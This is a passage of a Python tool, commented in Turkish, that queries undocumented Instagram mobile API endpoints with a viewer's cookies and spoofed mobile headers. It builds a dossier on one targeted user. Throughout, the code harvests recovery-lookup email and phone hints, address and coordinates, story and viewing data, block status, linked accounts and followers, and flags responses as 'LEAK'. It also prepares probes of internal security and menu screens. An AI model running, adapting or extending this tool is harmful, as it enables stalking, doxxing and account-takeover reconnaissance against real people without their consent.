            summary['target_latest_story_iso'] = ttd.get(
                'latest_reel_media_iso')
            summary['viewer_seen_target_story_iso'] = ttd.get('seen_iso')
            summary['target_story_media_count'] = ttd.get('media_count')

          
    e2ee = (aggregated['intel'].get('capabilities', {})
             .get('e2ee_capabilities', {})
             or aggregated['intel'].get('capabilities', {})
                  .get('secure_messaging_cap', {}))
    if e2ee and e2ee.get('target_capabilities'):
        summary['target_e2ee_capable'] = e2ee.get('is_e2ee_capable')
        summary['target_vanish_mode_enabled'] = e2ee.get(
            'vanish_mode_enabled')
        summary['target_cross_app_messaging_capable'] = e2ee.get(
            'cross_app_messaging_capable')

                  
    init_load = (aggregated['intel'].get('thread_meta', {})
                  .get('direct_initial_load', {}))
    if init_load:
        summary['inbox_most_recent_activity_iso'] = init_load.get(
            'most_recent_thread_activity_iso')
        summary['inbox_total_threads'] = init_load.get('inbox_total_threads')
        if init_load.get('target_threads'):
            summary['target_threads'] = init_load['target_threads']

                          
    svh = aggregated['intel'].get('story_viewer_harvest')
    if svh:
        viewed = [r for r in svh if r.get('target_viewed_story')]
        if viewed:
            summary['target_viewed_viewer_story'] = True
            summary['target_seen_at_data'] = [
                r.get('target_seen_data') for r in viewed]
        else:
            summary['target_viewed_viewer_story'] = False

    aggregated['summary'] = summary

    out_path = os.path.join(ARTIFACT_ROOT, target_username,
                              'activity_forensics.json')
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(aggregated, f, indent=2, ensure_ascii=False)

    print()
    if summary:
        print(f"  [+] ACTIVITY FORENSICS SUMMARY:")
        for k, v in summary.items():
            v_str = json.dumps(v, ensure_ascii=False) if isinstance(
                v, (dict, list)) else str(v)
            if len(v_str) > 110:
                v_str = v_str[:110] + '...'
            print(f"      {k:<36} = {v_str}")
    else:
        print(f"  [-] Hiçbir endpoint privacy-relevant intel döndürmedi.")
    rel = os.path.relpath(out_path, os.path.dirname(os.path.abspath(__file__)))
    print(f"  saved -> {rel}")
    return probes, None


                                                    
                                                                            
                                                                          
                                                                        
                                                                       
                                                         
 
                                                               
                                                                         

DEEP_PIGEON_ENDPOINTS = [
                                           
                                                                  
                                                                      
                                                           
                   
                                                                   
                                                                     
                                                                 
                                                                      
                    
                                                                    
                                                                         

                                                                      
                                                                       
                                                                        
    ('POST', '/api/v1/users/lookup/',
     'signed_body=SIGNATURE.%7B%22q%22%3A%22{username}%22%2C%22skip_recov'
     'ery%22%3A%221%22%2C%22device_id%22%3A%22android-poc%22%2C%22guid%22'
     '%3A%2200000000-0000-0000-0000-000000000000%22%2C%22directly_sign_'
     'in%22%3A%22true%22%7D&ig_sig_key_version=4',
     'account_lookup', 'identity'),

                                                                  
    ('GET',  '/api/v1/users/{pk}/info/?include_chaining=true'
              '&include_reel=true&include_suggested_users=true'
              '&include_highlight=true&include_account_intervention=true'
              '&include_business_address=true&include_live_status=true'
              '&from_module=profile',
     None, 'info_with_full_includes', 'identity'),

                                                                        
                                             
    ('GET',  '/api/v1/users/{pk}/info/?from_module=barcelona_profile'
              '&include_chaining=true',
     None, 'info_via_barcelona', 'identity'),

                                             
    ('GET',  '/api/v1/feed/user/{pk}/reel_media/',
     None, 'user_reel_media', 'media'),
    ('GET',  '/api/v1/feed/user/{pk}/story/',
     None, 'user_story_feed', 'media'),

                                        
    ('GET',  '/api/v1/highlights/{pk}/highlights_tray/',
     None, 'highlights_tray', 'media'),
    ('GET',  '/api/v1/feed/reels_media/?reel_ids={pk}'
              '&supported_capabilities_new=%5B%5D',
     None, 'reels_media_for_pk', 'media'),

                             
    ('GET',  '/api/v1/friendships/{pk}/mutual_followers/',
     None, 'mutual_followers_pigeon', 'graph'),

                                                      
    ('GET',  '/api/v1/users/web_profile_info/?username={username}',
     None, 'web_profile_pigeon', 'identity'),

                    
    ('GET',  '/api/v1/multiple_accounts/get_account_family/?user_id={pk}',
     None, 'account_family_pigeon', 'identity'),

                                               
    ('GET',  '/api/v1/users/{pk}/info/?from_module=restrict_set'
              '&include_chaining=true&include_reel=true',
     None, 'info_via_restrict', 'identity'),

                                         
    ('POST', '/api/v1/clips/user/',
     'target_user_id={pk}&page_size=12&max_id=&include_feed_video=true',
     'clips_user_post', 'media'),
]


def parse_account_lookup(text):
    """users/lookup/ shape: {obfuscated_email, obfuscated_phone, has_valid_phone,
    can_email_reset, can_sms_reset, account_recovery_options[]}"""
    try:
        d = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return None
    if not isinstance(d, dict):
        return None
    out = {}
    for k in ('obfuscated_email', 'obfuscated_phone', 'has_valid_phone',
               'can_email_reset', 'can_sms_reset', 'has_whatsapp_installed',
               'username', 'fb_login_option', 'is_facebook_only_account',
               'is_instagram_account', 'has_active_facebook_password',
               'has_fb_account_linked', 'gdpr_required',
               'should_show_recovery_options', 'gdpr_consent_required',
               'message', 'status'):
        if k in d:
            out[k] = d[k]
    if 'account_recovery_options' in d:
        out['recovery_options'] = d['account_recovery_options']
    return out or None


def parse_full_detail_info(text):
    """full_detail_info shape: {user_detail:{user:{...}}, suggested_users,
    highlight_tray, mutual_users, ...}"""
    try:
        d = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return None
    if not isinstance(d, dict):
        return None
    out = {}
    user = ((d.get('user_detail') or {}).get('user')) or d.get('user') or {}
    if user:
        out['fbid_v2'] = str(user.get('fbid_v2') or '') or None
        out['follower_count'] = user.get('follower_count')
        out['following_count'] = user.get('following_count')
        out['media_count'] = user.get('media_count')
        out['has_chaining'] = user.get('has_chaining')
        out['has_highlight_reels'] = user.get('has_highlight_reels')
        out['address_street'] = user.get('address_street')
        out['city_name'] = user.get('city_name')
        out['city_id'] = user.get('city_id')
        out['public_email'] = user.get('public_email')
        out['public_phone_number'] = user.get('public_phone_number')
        out['public_phone_country_code'] = user.get(
            'public_phone_country_code')
        out['contact_phone_number'] = user.get('contact_phone_number')
        out['business_contact_method'] = user.get('business_contact_method')
        out['latitude'] = user.get('latitude')
        out['longitude'] = user.get('longitude')
        out['zip'] = user.get('zip')
        out['account_badges'] = user.get('account_badges')
        out['interop_messaging_user_fbid'] = user.get(
            'interop_messaging_user_fbid')

    sugg = d.get('suggested_users') or {}
    if sugg:
        sl = sugg.get('suggestions') or []
        out['suggested_users_count'] = len(sl)
        out['suggested_users'] = [
            {
                'pk': str((s.get('user') or {}).get('pk') or ''),
                'username': (s.get('user') or {}).get('username'),
                'social_context': s.get('caption'),
            }
            for s in sl[:10]
        ]

    mu = d.get('mutual_users') or {}
    if mu:
        out['mutual_users_count'] = mu.get('total_count') or len(
            mu.get('users') or [])
        out['mutual_users_sample'] = [
            {'pk': str(u.get('pk') or ''), 'username': u.get('username')}
            for u in (mu.get('users') or [])[:10]
        ]

    ht = d.get('highlight_tray') or d.get('reel_feed') or []
    if ht:
        out['highlights_count'] = len(ht)
        out['highlights_meta'] = []
        for h in ht[:10]:
            out['highlights_meta'].append({
                'id': h.get('id'),
                'title': h.get('title'),
                'created_at': h.get('created_at'),
                'created_iso': _iso_ms((h.get('created_at') or 0) * 1000)
                                 if h.get('created_at') else None,
                'media_count': h.get('media_count'),
                'cover_media_url': ((h.get('cover_media') or {})
                                       .get('cropped_image_version') or {}
                                     ).get('url'),
            })

    return out or None


def extract_all_user_fields(user_obj):
    """info/restrict/barcelona endpoint'lerinden 208 user field'ın
    privacy-relevant olan ~50 tanesini çıkar. Phase 14'tekinden ÇOK geniş."""
    if not isinstance(user_obj, dict):
        return None
    PRIV_FIELDS = (
                  
        'pk', 'pk_id', 'id', 'fbid_v2', 'fbid', 'eimu_id', 'instagram_pk',
        'interop_messaging_user_fbid', 'username', 'full_name',
        'guardian_id', 'group_metadata',
                       
        'is_private', 'is_verified', 'is_business', 'account_type',
        'has_blocked_viewer', 'blocked_by_viewer', 'follow_friction_type',
        'allowed_commenter_type', 'profile_grid_display_type',
        'highlights_tray_type', 'show_account_transparency_details',
        'has_private_collections', 'is_meta_verified_label_eligible',
        'professional_conversion_suggested_account_type',
               
        'follower_count', 'following_count', 'media_count',
        'mutual_followers_count', 'usertags_count', 'highlight_reel_count',
                                                 
        'public_email', 'public_phone_number', 'public_phone_country_code',
        'contact_phone_number', 'business_email', 'business_phone_number',
        'business_contact_method', 'business_category_name',
        'business_address_json', 'address_street', 'city_name', 'city_id',
        'zip', 'latitude', 'longitude', 'category_name',
             
        'biography', 'biography_email_addresses', 'biography_phone_numbers',
        'external_url', 'external_lynx_url', 'pronouns', 'category',
                        
        'is_active_on_text_post_app', 'has_public_tab_threads',
        'show_text_post_app_switcher_badge', 'threads_profile_glyph_url',
        'fb_profile_biolink', 'has_fb_account_linked',
                                   
        'has_chaining', 'has_highlight_reels', 'has_videos',
        'has_music_on_profile', 'has_visible_media_notes',
        'has_visible_clips_tab', 'has_unseen_besties_media',
        'has_fan_club_subscriptions', 'has_exclusive_feed_content',
        'has_collab_collections', 'has_views_fetching',
        'avatar_status', 'live_subscription_status',
        'birthday_today_visibility_for_viewer',
                                         
        'is_eligible_for_meta_verified_label',
        'is_eligible_for_meta_verified_links_in_reels',
        'is_eligible_for_post_boost_mv_upsell',
        'is_eligible_for_creator_product_links',
        'is_eligible_for_schools_search_upsell',
        'include_direct_blacklist_status', 'is_direct_roll_call_enabled',
        'is_profile_broadcast_sharing_enabled',
        'auto_expand_chaining', 'open_external_url_with_in_app_browser',
                            
        'posts_subscription_status', 'reels_subscription_status',
        'stories_subscription_status', 'live_subscription_status',
                       
        'profile_pic_id', 'profile_pic_url', 'has_anonymous_profile_picture',
        'is_profile_picture_expansion_enabled', 'highlight_reshare_disabled',
        'feed_post_reshare_disabled',
                               
        'request_contact_enabled', 'spam_follower_setting_enabled',
        'remove_message_entrypoint', 'is_whatsapp_linked',
        'is_in_canada', 'is_regulated_news_in_viewer_location',
        'country_block', 'short_drama_role',
    )
    out = {}
    for k in PRIV_FIELDS:
        v = user_obj.get(k)
        if v is not None and v != '' and v != [] and v != {}:
            out[k] = v
                        
    bwe = user_obj.get('biography_with_entities') or {}
    if bwe.get('entities'):
        out['linked_accounts_in_bio'] = [
            {'pk': str((e.get('user') or {}).get('id') or ''),
             'username': (e.get('user') or {}).get('username')}
            for e in bwe['entities']
            if (e.get('user') or {}).get('username')
        ]
    if user_obj.get('hd_profile_pic_versions'):
        out['hd_profile_pic_versions'] = [
            {'w': v.get('width'), 'h': v.get('height'),
             'url': (v.get('url') or '')[:200]}
            for v in user_obj['hd_profile_pic_versions']
        ]
    bio_links = user_obj.get('bio_links') or []
    if bio_links:
        out['bio_links'] = [
            {'url': l.get('url'), 'title': l.get('title'),
             'click_id': (l.get('click_id') or '')[:80]}
            for l in bio_links
        ]
    pinned_ch = user_obj.get('pinned_channels_info') or {}
    if pinned_ch.get('pinned_channels_list'):
        out['pinned_broadcast_channels'] = pinned_ch['pinned_channels_list']
    fan_club = user_obj.get('fan_club_info') or {}
    if any(v is not None for v in fan_club.values()):
        out['fan_club_info'] = {k: v for k, v in fan_club.items()
                                  if v is not None}
                                
    if user_obj.get('chaining_results'):
        out['chaining_results_count'] = len(user_obj['chaining_results'])
    return out or None


def parse_deep_pigeon_response(label, text, target_pk, target_username):
    """Endpoint label'ına göre extraction. v3: info_via_restrict ve
    info_with_full_includes için tam user object dump."""
    if label in ('account_lookup', 'recovery_flow'):
        return parse_account_lookup(text)

    try:
        d = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return None
    if not isinstance(d, dict):
        return None
    out = {}
    target_pk_str = str(target_pk)

                                                                    
    if label in ('info_with_full_includes', 'info_via_barcelona',
                  'info_via_restrict'):
        u = d.get('user') or {}
        full_dump = extract_all_user_fields(u)
        if full_dump:
            out['full_user_fields'] = full_dump
            out['field_count'] = len(full_dump)
                                                                          
        sugg = d.get('suggested_users') or {}
        if sugg.get('suggestions'):
            out['suggested_users_count'] = len(sugg['suggestions'])
            out['suggested_users'] = [
                {
                    'pk': str((s.get('user') or {}).get('pk') or ''),
                    'username': (s.get('user') or {}).get('username'),
                }
                for s in sugg['suggestions'][:15]
            ]
        return out or None

    if label in ('user_reel_media', 'user_story_feed', 'reels_media_for_pk'):
                                                            
        items = (d.get('items')
                  or (d.get('reel') or {}).get('items')
                  or [])
                                                             
        reels = d.get('reels') or {}
        if reels and not items:
            r = reels.get(target_pk_str) or {}
            items = r.get('items') or []
        out['story_item_count'] = len(items)
        out['story_items'] = []
        for it in items[:10]:
            out['story_items'].append({
                'id': it.get('id') or it.get('pk'),
                'taken_at': it.get('taken_at'),
                'taken_at_iso': _iso_ms((it.get('taken_at') or 0) * 1000)
                                  if it.get('taken_at') else None,
                'expiring_at': it.get('expiring_at'),
                'media_type': it.get('media_type'),
                'image_url': ((it.get('image_versions2') or {}).get(
                    'candidates') or [{}])[0].get('url'),
                'video_url': (it.get('video_versions') or [{}])[0].get(
                    'url') if it.get('video_versions') else None,
            })

    elif label == 'highlights_tray':
        tray = d.get('tray') or []
        out['highlights_count'] = len(tray)
        out['highlights'] = []
        for h in tray[:20]:
            out['highlights'].append({
                'id': h.get('id'),
                'title': h.get('title'),
                'created_at': h.get('created_at'),
                'created_iso': _iso_ms((h.get('created_at') or 0) * 1000)
                                 if h.get('created_at') else None,
                'media_count': h.get('media_count'),
                'latest_reel_media': h.get('latest_reel_media'),
                'latest_reel_media_iso': _iso_ms(
                    (h.get('latest_reel_media') or 0) * 1000)
                    if h.get('latest_reel_media') else None,
                'cover_media_id': (h.get('cover_media') or {}).get('media_id'),
            })

    elif label == 'iglive_info':
        out['live_keys'] = sorted(d.keys())
        for k in ('broadcast_status', 'is_live', 'broadcast_id',
                   'published_time', 'viewer_count'):
            if k in d:
                out[k] = d[k]

    elif label == 'interest_recs':
        users = d.get('users') or d.get('suggestions') or []
        out['interest_rec_count'] = len(users)
        out['interest_recs'] = []
        for u in users[:15]:
            user_obj = u.get('user') or u
            out['interest_recs'].append({
                'pk': str(user_obj.get('pk') or ''),
                'username': user_obj.get('username'),
                'is_private': user_obj.get('is_private'),
            })

    elif label in ('mutual_followers_pigeon', 'recent_followers_list'):
        users = d.get('users') or []
        out['user_count'] = len(users)
        out['users'] = [
            {
                'pk': str(u.get('pk') or ''),
                'username': u.get('username'),
                'is_private': u.get('is_private'),
            }
            for u in users[:30]
        ]

    elif label == 'restricted_via_pigeon':
        users = d.get('users') or []
        out['restricted_count'] = len(users)
        out['target_in_restricted'] = any(
            str(u.get('pk') or '') == target_pk_str for u in users)

    elif label == 'web_profile_pigeon':
                                                                              
        u = (d.get('data') or {}).get('user') or d.get('user') or {}
        if u:
            WEB_PROF_FIELDS = (
                'id', 'pk', 'fbid', 'eimu_id', 'guardian_id',
                'username', 'full_name', 'biography', 'category_name',
                'category_enum', 'business_category_name',
                'business_email', 'business_phone_number',
                'business_address_json', 'business_contact_method',
                'external_url', 'external_url_linkshimmed',
                'fb_profile_biolink', 'pronouns',
                'is_private', 'is_verified', 'is_business_account',
                'is_professional_account', 'is_supervision_enabled',
                'is_joined_recently', 'is_embeds_disabled', 'is_eligible_to_subscribe',
                'has_blocked_viewer', 'blocked_by_viewer',
                'restricted_by_viewer', 'has_chaining', 'has_ar_effects',
                'has_clips', 'has_guides', 'has_channel',
                'follows_viewer', 'followed_by_viewer',
                'requested_by_viewer', 'has_requested_viewer',
                'mutual_followers_count', 'country_block', 'group_metadata',
                'ai_agent_type', 'profile_pic_url_hd', 'profile_pic_url',
                'highlight_reel_count',
            )
            for k in WEB_PROF_FIELDS:
                if k in u and u[k] is not None and u[k] != '':
                    out[k] = u[k]
                                                                       
            for ek in ('edge_followed_by', 'edge_follow',
                        'edge_mutual_followed_by',
                        'edge_owner_to_timeline_media'):
                e = u.get(ek) or {}
                if isinstance(e, dict) and 'count' in e:
                    out[f'{ek}_count'] = e['count']
                                                                  
                if ek == 'edge_mutual_followed_by' and e.get('edges'):
                    out['mutual_sample'] = [
                        (n.get('node') or {}).get('username')
                        for n in e['edges'][:5]
                    ]
                                            
            bwe = u.get('biography_with_entities') or {}
            if bwe.get('entities'):
                out['bio_entities'] = [
                    {'username': (en.get('user') or {}).get('username'),
                     'pk': str((en.get('user') or {}).get('id') or '')}
                    for en in bwe['entities']
                ]
                                             
            out['_all_keys_count'] = len(u)
                                
            if u.get('connected_fb_page'):
                out['connected_fb_page'] = u['connected_fb_page']
            if u.get('hd_profile_pic_url_info'):
                out['hd_profile_pic_url_info'] = u['hd_profile_pic_url_info']

    elif label == 'clips_user_post':
        items = d.get('items') or []
        out['clips_count'] = len(items)
        out['clips'] = []
        for c in items[:10]:
            m = c.get('media') or c
            out['clips'].append({
                'id': m.get('id') or m.get('pk'),
                'taken_at': m.get('taken_at'),
                'taken_at_iso': _iso_ms((m.get('taken_at') or 0) * 1000)
                                  if m.get('taken_at') else None,
                'play_count': m.get('play_count'),
                'view_count': m.get('view_count'),
                'caption': (m.get('caption') or {}).get('text', '')[:200]
                              if m.get('caption') else None,
                'image_url': ((m.get('image_versions2') or {}).get(
                    'candidates') or [{}])[0].get('url', '')[:200],
            })

    elif label == 'account_family_pigeon':
        accounts = d.get('accounts') or d.get('account_family') or []
        out['linked_account_count'] = len(accounts)
        out['linked_accounts'] = [
            {
                'pk': str(a.get('pk') or a.get('user_id') or ''),
                'username': a.get('username'),
                'full_name': a.get('full_name'),
                'is_primary': a.get('is_primary'),
            }
            for a in accounts[:10]
            if isinstance(a, dict)
        ]

    elif label == 'info_via_restrict':
        u = d.get('user') or {}
        out['friction_signals'] = {k: u.get(k) for k in (
            'allowed_commenter_type', 'comment_settings_pref',
            'restrict_status', 'is_restricted', 'has_restricted_thread',
            'follow_friction_type', 'profile_grid_display_type',
        ) if k in u}

    elif label == 'clips_user_pigeon':
        items = d.get('items') or []
        out['clips_count'] = len(items)
        out['clips'] = []
        for c in items[:10]:
            m = c.get('media') or c
            out['clips'].append({
                'id': m.get('id') or m.get('pk'),
                'taken_at': m.get('taken_at'),
                'taken_at_iso': _iso_ms((m.get('taken_at') or 0) * 1000)
                                  if m.get('taken_at') else None,
                'play_count': m.get('play_count'),
                'view_count': m.get('view_count'),
                'caption': (m.get('caption') or {}).get('text', '')[:200]
                              if m.get('caption') else None,
            })

    return out or None


def run_deep_pigeon_probes(target_username, target_pk, cookies, save, proxies):
    """Phase 22: i.instagram.com host + mobile pigeon header set'le 15 yeni
    endpoint vurur. Web kanalında 404 dönen endpoint'lerin pigeon kanalında
    çalıştığı kanıtlandı (Phase 14 pattern'i)."""
    if not cookies or not target_pk:
        return [], None

    viewer_pk = (cookies or {}).get('ds_user_id', '')
    aggregated = {
        'target_pk': str(target_pk),
        'target_username': target_username,
        'viewer_pk': viewer_pk,
        'endpoints_probed': [],
        'intel': {},
    }
    probes = []

    print(f"  [*] {len(DEEP_PIGEON_ENDPOINTS)} endpoint "
          f"(i.instagram.com + mobile pigeon header)")

    h_base = build_mobile_pigeon_headers(cookies)
    h_base['x-csrftoken'] = cookies['csrftoken']

    for method, path_tpl, body_tpl, label, intel_key in DEEP_PIGEON_ENDPOINTS:
        path = path_tpl.format(pk=target_pk, username=target_username)
        url = f'https://i.instagram.com{path}'
        body = (body_tpl.format(pk=target_pk, username=target_username)
                  if body_tpl is not None else None)

        h = dict(h_base)
        if method == 'POST':
            h['content-type'] = 'application/x-www-form-urlencoded'

        try:
            if method == 'POST':
                r = requests.post(url, headers=h, cookies=cookies, data=body,
                                   proxies=proxies, timeout=30,
                                   allow_redirects=False)
            else:
                r = requests.get(url, headers=h, cookies=cookies,
                                  proxies=proxies, timeout=30,
                                  allow_redirects=False)
        except requests.exceptions.RequestException as e:
            print(f"  [{method:<4}] {label:<26} EXC {type(e).__name__}")
            time.sleep(0.6)
            continue

        sig = response_signature(r)
        intel = None
        if r.status_code == 200 and r.text.strip().startswith('{'):
            intel = parse_deep_pigeon_response(label, r.text, target_pk,
                                                  target_username)
        plabel = f'deep_pigeon__{label}'
        if save:
            ext = ('json' if r.text.strip().startswith('{')
                    or r.text.strip().startswith('[') else 'html')
            save_artifact(target_username, plabel, r.text, ext)

        flag = ''
        if intel:
            if intel.get('obfuscated_email'):
                flag = (f" *** EMAIL_LEAK={intel['obfuscated_email']} "
                        f"PHONE={intel.get('obfuscated_phone') or '-'}")
            elif intel.get('field_count', 0) > 0:
                                                             
                flag = f" *** {intel['field_count']} privacy fields dumped"
                fud = intel.get('full_user_fields') or {}
                                                   
                if fud.get('has_blocked_viewer'):
                    flag += f" BLOCKED_BY_TARGET=True"
                if fud.get('city_name') or fud.get('public_email'):
                    flag += (f" GEO={fud.get('city_name')}"
                              f" PUB_EMAIL={fud.get('public_email')}")
            elif intel.get('story_item_count', 0) > 0:
                flag = f" *** STORY_LEAK count={intel['story_item_count']}"
            elif intel.get('highlights_count', 0) > 0:
                flag = f" *** highlights={intel['highlights_count']}"
            elif intel.get('clips_count', 0) > 0:
                flag = f" *** CLIPS_LEAK count={intel['clips_count']}"
            elif intel.get('user_count', 0) > 0:
                flag = f" *** users={intel['user_count']}"
            elif intel.get('linked_account_count', 0) > 0:
                flag = f" *** linked={intel['linked_account_count']}"
            elif intel.get('_all_keys_count', 0) > 0:
                                    
                flag = (f" *** {intel['_all_keys_count']} keys, "
                        f"{len([k for k in intel if not k.startswith('_')])} extracted")
                if intel.get('has_blocked_viewer'):
                    flag += " HAS_BLOCKED_VIEWER=True"
                if intel.get('mutual_sample'):
                    flag += f" mutuals={intel['mutual_sample'][:3]}"
            elif intel.get('public_email') or intel.get('public_phone_number'):
                flag = (f" *** PUBLIC email={intel.get('public_email')} "
                        f"phone={intel.get('public_phone_number')}")
            else:
                flag = f" intel_keys={list(intel.keys())[:3]}"

        print(f"  [{method:<4}] {label:<26} HTTP {sig['status']:<3} "
              f"{sig['bytes']:>5}B{flag}")

        if intel:
            target_bucket = aggregated['intel'].setdefault(intel_key, {})
            target_bucket[label] = intel
        aggregated['endpoints_probed'].append({
            'label': label, 'method': method, 'path': path,
            'status': sig['status'], 'bytes': sig['bytes'],
            'has_intel': bool(intel),
        })
        probes.append({
            'kind': f'deep_pigeon_{label}', 'url': url,
            'label': plabel, 'sig': sig,
            'scan': scan_markers(r.text), 'response': r,
            'deep_intel': intel,
        })
        time.sleep(0.5)

                                                                 
    summary = {}

                                                                      
                                                                           
    for info_label in ('info_with_full_includes', 'info_via_restrict',
                        'info_via_barcelona'):
        info_intel = aggregated['intel'].get('identity', {}).get(info_label,
                                                                    {})
        if info_intel and info_intel.get('full_user_fields'):
            summary[f'{info_label}__field_count'] = info_intel['field_count']
                                                                      
            fud = info_intel['full_user_fields']
            HIGHLIGHT_FIELDS = (
                'has_blocked_viewer', 'blocked_by_viewer',
                'follow_friction_type', 'has_private_collections',
                'eimu_id', 'guardian_id', 'group_metadata',
                'public_email', 'public_phone_number',
                'business_email', 'business_phone_number',
                'business_address_json', 'address_street', 'city_name',
                'zip', 'latitude', 'longitude', 'category_name',
                'birthday_today_visibility_for_viewer',
                'is_active_on_text_post_app', 'has_public_tab_threads',
                'is_meta_verified_label_eligible',
                'live_subscription_status', 'avatar_status',
                'allowed_commenter_type', 'is_supervision_features_enabled',
                'highlight_reel_count', 'usertags_count',
            )
            for hf in HIGHLIGHT_FIELDS:
                if fud.get(hf) is not None:
                    summary[f'{info_label}__{hf}'] = fud[hf]
            if fud.get('linked_accounts_in_bio'):
                summary[f'{info_label}__bio_linked'] = fud[
                    'linked_accounts_in_bio']
            if fud.get('pinned_broadcast_channels'):
                summary[f'{info_label}__pinned_channels'] = fud[
                    'pinned_broadcast_channels']
            if fud.get('fan_club_info'):
                summary[f'{info_label}__fan_club'] = fud['fan_club_info']
            if info_intel.get('suggested_users'):
                summary[f'{info_label}__suggested_users'] = [
                    f"@{u['username']}"
                    for u in info_intel['suggested_users'][:8]]
            break                         

                                    
    wp = aggregated['intel'].get('identity', {}).get('web_profile_pigeon', {})
    if wp:
        WEB_HIGHLIGHTS = ('has_blocked_viewer', 'blocked_by_viewer',
                            'restricted_by_viewer', 'follows_viewer',
                            'followed_by_viewer', 'requested_by_viewer',
                            'has_requested_viewer', 'mutual_followers_count',
                            'eimu_id', 'guardian_id', 'group_metadata',
                            'country_block', 'fb_profile_biolink',
                            'business_email', 'business_phone_number',
                            'business_address_json', 'category_name',
                            'business_category_name', 'is_supervision_enabled',
                            'is_joined_recently', 'is_embeds_disabled',
                            'ai_agent_type', 'edge_followed_by_count',
                            'edge_follow_count',
                            'edge_owner_to_timeline_media_count')
        for hf in WEB_HIGHLIGHTS:
            if wp.get(hf) is not None:
                summary[f'web__{hf}'] = wp[hf]
        if wp.get('mutual_sample'):
            summary['web__mutual_sample'] = wp['mutual_sample']
        if wp.get('bio_entities'):
            summary['web__bio_entities'] = wp['bio_entities']

    al = aggregated['intel'].get('identity', {}).get('account_lookup', {})
    if al:
        for k in ('obfuscated_email', 'obfuscated_phone', 'has_valid_phone',
                   'can_email_reset', 'can_sms_reset',
                   'has_whatsapp_installed', 'fb_login_option',
                   'has_fb_account_linked', 'is_instagram_account'):
            if al.get(k) is not None:
                summary[f'lookup__{k}'] = al[k]

    rf = aggregated['intel'].get('identity', {}).get('recovery_flow', {})
    if rf:
        for k in ('obfuscated_email', 'obfuscated_phone'):
            if rf.get(k) is not None:
                summary[f'recovery__{k}'] = rf[k]

    sm = aggregated['intel'].get('media', {})
    for label, intel in sm.items():
        if intel.get('story_item_count', 0) > 0:
            summary[f'{label}__story_items'] = intel['story_items']
        if intel.get('highlights_count', 0) > 0:
            summary[f'{label}__highlights'] = intel['highlights']
        if intel.get('clips_count', 0) > 0:
            summary[f'{label}__clips_count'] = intel['clips_count']
            summary[f'{label}__clips_sample'] = intel['clips'][:3]

    sg = aggregated['intel'].get('graph', {})
    for label, intel in sg.items():
        if intel.get('user_count', 0) > 0:
            summary[f'{label}__users'] = intel['users'][:10]

    aggregated['summary'] = summary

    out_path = os.path.join(ARTIFACT_ROOT, target_username,
                              'deep_pigeon.json')
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(aggregated, f, indent=2, ensure_ascii=False)

    print()
    if summary:
        print(f"  [+] DEEP PIGEON SUMMARY:")
        for k, v in summary.items():
            v_str = json.dumps(v, ensure_ascii=False) if isinstance(
                v, (dict, list)) else str(v)
            if len(v_str) > 130:
                v_str = v_str[:130] + '...'
            print(f"      {k:<40} = {v_str}")
    else:
        print(f"  [-] Hiçbir endpoint privacy-relevant intel döndürmedi.")
    rel = os.path.relpath(out_path, os.path.dirname(os.path.abspath(__file__)))
    print(f"  saved -> {rel}")
    return probes, None


                                                       
                                                                      
                                                                    
                                                                         
                                                                     
                                                                 
                                                       
                                                             
                                                                    
                                   
 
                                                                               
                                                        
 
                                                           

BLOKS_PROBE_APPS = [
                                                                  
    ('com.instagram.profile.menu.options_action_sheet',
     '%7B%22user_id%22%3A%22{pk}%22%2C%22source_module%22%3A%22profile'
     '%22%7D',
     'profile_options_sheet', 'menu'),

                                                               
    ('com.instagram.user_appeal.user_appeal_form',
     '%7B%22reportable_user_id%22%3A%22{pk}%22%2C%22source%22%3A%22'
     'profile%22%7D',
     'user_appeal_form', 'menu'),

                                         
    ('com.bloks.www.ig.profile.menu',
     '%7B%22user_id%22%3A%22{pk}%22%7D',
     'profile_menu_full', 'menu'),

                                                 
    ('com.bloks.www.ig.restrict.action_sheet',
     '%7B%22target_user_id%22%3A%22{pk}%22%2C%22context%22%3A%22'
     'profile%22%7D',
     'restrict_sheet', 'block'),

                                                             
    ('com.bloks.www.ig.block.confirmation_sheet',
     '%7B%22target_user_id%22%3A%22{pk}%22%2C%22source%22%3A%22'
     'profile%22%7D',
     'block_confirmation', 'block'),

                                                        
    ('com.bloks.www.ig.direct.thread.options_sheet',
     '%7B%22recipient_id%22%3A%22{pk}%22%7D',
     'dm_options_sheet', 'thread'),

                                           
    ('com.instagram.shopping.profile_shop_view',
     '%7B%22owner_user_id%22%3A%22{pk}%22%7D',
     'profile_shop_view', 'media'),

                                                                   
                           
    ('com.bloks.www.caa.account_security',
     '%7B%22user_id%22%3A%22{pk}%22%7D',
     'account_security', 'identity'),

                                           
    ('com.instagram.bloks.ig.profile.action_sheet',
     '%7B%22user_id%22%3A%22{pk}%22%2C%22container_module%22%3A%22'
     'profile%22%7D',
     'ig_profile_action_sheet', 'menu'),

                                                                
    ('com.instagram.creator_marketplace.brand_profile',
     '%7B%22user_id%22%3A%22{pk}%22%7D',
     'creator_marketplace_brand', 'identity'),
]


def parse_bloks_response(label, text, target_pk):
    """Bloks response'u nested action data içerir. Privacy-relevant
    sinyaller bloks_payload içindeki 'action' tree'sinde gizlidir.
    En önemli pattern'ler:
      - "block_eligibility" / "restrict_eligibility" → bool
      - "report_categories" → IG'nin sınıflandırma listesi
      - "menu_items" → action sheet'teki tıklanabilir öğeler
      - "warning_text" / "subtitle" → IG'nin gösterdiği uyarı metni
    """
    out = {}
    out['response_size_bytes'] = len(text)
    target_pk_str = str(target_pk)

                                                                     
                                                                   
    try:
        d = json.loads(text)
    except (json.JSONDecodeError, ValueError):
                                                                                   
        if '<html' in text.lower():
            out['error'] = 'html_response'
            return out
        return None

    if not isinstance(d, dict):
        return None

                                                                     
    layout = d.get('layout') or {}
    bloks_payload = layout.get('bloks_payload') or d.get('bloks_payload')

    if not bloks_payload:
        out['error'] = d.get('error_message') or d.get('message') or 'no_bloks'
        out['top_level_keys'] = list(d.keys())[:10]
        return out

                                                       
    payload_str = json.dumps(bloks_payload, ensure_ascii=False)
    out['payload_size_chars'] = len(payload_str)

                                              
    interesting_patterns = {
        'block_eligibility_signals': r'"is_block(?:ed|ing)"\s*:\s*(true|false)',
